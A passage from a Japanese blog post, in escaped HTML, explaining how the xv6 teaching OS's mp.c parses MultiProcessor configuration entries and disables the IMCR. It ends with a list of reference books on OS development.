        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Local Interrupt Entry&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3b0896cae18d6fa27616529c9db55817/0b533/image-36.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 39.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAARlAAAEZQAGA43XUAAABhUlEQVQoz11SyZKCQAzl/3/Gmpsnaxy8aImjIloKLqDstBubwOFNEqvmIFVNd9JJXt5La1EUoSxLFEWBsipxPB5xvV7fNvlVlsHzPDyfT/Hl+ROck6ap2Lz4fL/fUdc1NP9yQb/fx8/wG4PBAL7vY7NeY7k0sVgssN3tEMcxttstDMPAfr8Xu64rrExT4nIqmmUpgeXQGGEyGeOr15OE16vBzJjKeTweY2VZgp6mifiUUlDEoG0pbmZgOjXo3BFIJHEat6lUhp1t40R0OWm93uBwOAhVBmAJ3ncz8ed5gSDwYVOO67q4EEumzbJot9tNKs/nc6I9hD4aIQxDWVyEC2SZElBd1+EHgWj7eDwkhgux/d8hd8EJMQnt+4Hop9RV9GDEgDT1zmfq9IWu69A0DZIkkXuW6y1HCm6MYzT+MW3e27aF49gwSWyLCjuOQ7RdWNaKxF/KkHgQvP8So4xeAANUVU2rkk41fHzc+ul0kknyABg5JJpML6D9TN3yS2BmJRX5/P4AbOBPKN6XDQsAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3b0896cae18d6fa27616529c9db55817/8ac56/image-36.webp 240w,
/static/3b0896cae18d6fa27616529c9db55817/d3be9/image-36.webp 480w,
/static/3b0896cae18d6fa27616529c9db55817/b0a15/image-36.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3b0896cae18d6fa27616529c9db55817/8ff5a/image-36.png 240w,
/static/3b0896cae18d6fa27616529c9db55817/e85cb/image-36.png 480w,
/static/3b0896cae18d6fa27616529c9db55817/0b533/image-36.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3b0896cae18d6fa27616529c9db55817/0b533/image-36.png&quot;
            alt=&quot;2022/01/image-36.png&quot;
            title=&quot;2022/01/image-36.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel MultiProcessor Specification  | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSの以下のコードでも、MPコンフィグレーションヘッダの先頭から各エントリをチェックしていき、先頭の&lt;code class=&quot;language-text&quot;&gt;Entry Type&lt;/code&gt;の値に応じて処理を分岐させています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; e&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPPROC&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    proc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ncpu &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; NCPU&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ncpu&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; proc&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;apicid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// apicid may differ from ncpu&lt;/span&gt;
      ncpu&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPIOAPIC&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    ioapic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ioapicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;apicno&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPBUS&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPIOINTR&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPLINTR&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          
  &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    ismp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;チェックしているエントリは以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Table entry types&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MPPROC&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// One per processor&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MPBUS&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x01&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// One per bus&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MPIOAPIC&lt;/span&gt;  &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x02&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// One per I/O APIC&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MPIOINTR&lt;/span&gt;  &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x03&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// One per bus interrupt source&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MPLINTR&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x04&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// One per system interrupt source&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;processor-entryの情報取得&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#processor-entry%E3%81%AE%E6%83%85%E5%A0%B1%E5%8F%96%E5%BE%97&quot; aria-label=&quot;processor entryの情報取得 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Processor Entryの情報取得&lt;/h3&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;Processor Entry&lt;/code&gt;の場合です。&lt;/p&gt;
&lt;p&gt;ここでは&lt;code class=&quot;language-text&quot;&gt;mpproc&lt;/code&gt;構造体のオブジェクトとして&lt;code class=&quot;language-text&quot;&gt;Processor Entriy&lt;/code&gt;を取得し、&lt;code class=&quot;language-text&quot;&gt;Local APIC ID&lt;/code&gt;の値をすべての&lt;code class=&quot;language-text&quot;&gt;cpus&lt;/code&gt;配列に順に格納しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPPROC&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
  proc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ncpu &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; NCPU&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ncpu&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; proc&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;apicid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// apicid may differ from ncpu&lt;/span&gt;
    ncpu&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちなみにここで使用されている&lt;code class=&quot;language-text&quot;&gt;NCPU&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;param.h&lt;/code&gt;で以下のように定数として定義されています。&lt;/p&gt;
&lt;p&gt;xv6OSは最大で8CPUまでサポートしているようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NCPU&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// maximum number of CPUs&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;ioapicの情報取得&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ioapic%E3%81%AE%E6%83%85%E5%A0%B1%E5%8F%96%E5%BE%97&quot; aria-label=&quot;ioapicの情報取得 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IOAPICの情報取得&lt;/h3&gt;
&lt;p&gt;続いては&lt;code class=&quot;language-text&quot;&gt;IOAPIC&lt;/code&gt;の情報を取得します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPIOAPIC&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
  ioapic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ioapicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;apicno&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;各構造体などについては前述したので割愛します。&lt;/p&gt;
&lt;h3 id=&quot;imcrの変更&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#imcr%E3%81%AE%E5%A4%89%E6%9B%B4&quot; aria-label=&quot;imcrの変更 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IMCRの変更&lt;/h3&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;mp.c&lt;/code&gt;の処理はほぼ完了しました。&lt;/p&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;IMCR&lt;/code&gt;を無効化します。&lt;/p&gt;
&lt;p&gt;IMCRは割り込みモード構成レジスタと呼ばれ、PICモードから変更するためには&lt;code class=&quot;language-text&quot;&gt;IMCR&lt;/code&gt;の変更が必要になるようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://reverseengineering.stackexchange.com/questions/26308/where-is-the-imcr-defined-in-the-docs&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86 - Where is the IMCR defined in the docs? - Reverse Engineering Stack Exchange&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://forum.osdev.org/viewtopic.php?f=1&amp;#x26;t=29102&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;OSDev.org • View topic - Set IMCR to 0x1 to mask external interrupts?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html?page=31&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Default Configurations; Symmetric I/O Mode - Intel MultiProcessor Specification [Page 31] | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;次回は&lt;code class=&quot;language-text&quot;&gt;lapicinit&lt;/code&gt;関数から始めます。&lt;/p&gt;
&lt;p&gt;今回取得した情報を利用して割込みコントローラを実装するようです。&lt;/p&gt;
&lt;p&gt;だんだん頭がついてこなくなってきたのでちょっと気合入れて頑張ろうと思います。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
